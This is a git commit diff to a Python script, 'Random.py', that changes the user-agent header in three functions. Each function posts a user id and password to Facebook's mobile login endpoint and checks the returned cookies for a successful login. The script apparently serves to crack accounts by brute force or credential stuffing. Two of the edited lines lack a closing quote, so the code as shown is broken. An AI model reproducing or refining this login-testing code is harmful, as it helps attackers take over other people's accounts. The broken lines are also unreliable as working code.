a2b90f4718e95e5fba5f25389a55d82ee4f41b14
ACTION-FIRE <122881764+ACTION-FIRE@users.noreply.github.com>
2023-02-26 17:49:24 +0300

    Update Random.py

--- Random.py
+++ Random.py
@@ -375,7 +375,7 @@ def a(uid,pwx,tl):
             "sec-fetch-site": 'none',
             "sec-fetch-user": '?1',
             "upgrade-insecure-requests": '1',
-            "user-agent": pro}
+            "user-agent": 'Mozilla/5.0 (Linux; Android 12; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -444,7 +444,7 @@ def b(uid,pwx,tl):
             "sec-fetch-site": 'none',
             "sec-fetch-user": '?1',
             "upgrade-insecure-requests": '1',
-            "user-agent": pro}
+            "user-agent": 'Mozilla/5.0 (Linux; Android 12; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -500,7 +500,7 @@ def c(uid,pwx,tl):
             "sec-fetch-site": 'none',
             "sec-fetch-user": '?1',
             "upgrade-insecure-requests": '1',
-            "user-agent": 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'}
+            "user-agent": 'Mozilla/5.0 (Linux; Android 12; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
